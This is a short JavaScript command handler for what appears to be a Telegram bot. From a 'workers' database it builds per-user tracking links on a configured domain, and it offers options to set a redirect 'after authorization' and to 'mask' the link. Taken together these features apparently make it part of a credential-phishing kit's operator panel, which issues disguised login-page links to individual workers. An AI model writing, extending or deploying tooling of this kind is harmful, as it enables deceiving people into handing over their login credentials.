var links = require(`../json/links.json`),
    database_worker = require("../mysql/workers"),
    config = require("../config.json");

module.exports = {
	r: /^(link)$/i,
	f: function (msg, user_from_id, args, data) {
        database_worker.findUser(user_from_id, (user) => {
            var links_list = [];
            links.forEach((data) => {
                links_list.push(`<a href="https://${config.domain}/${data.link}/${user_from_id}">${data.name}</a> ➡️ <code>https://${config.domain}/${data.link}/${user_from_id}</code>`);
            });

            data({
                text: `<b>🗒 Ссылки 🗒</b>\n${links_list.join(`\n\n`)}\n\n🚪 Переход после авторизации: ${user[0].link}`,
                keyboard: [
                    [{"text": `Изменить ссылку 🏷`, callback_data: "edit_link"}],
                    [{"text": "Маскировать ссылку  🎭", callback_data: "mask_link"}],
                    [{"text": `◀️ Назад `, callback_data: "menu"}]
                  ],
                  edit: true
            });
        });
	},
	desc: "",
	rights: 0,
	type: "all"
}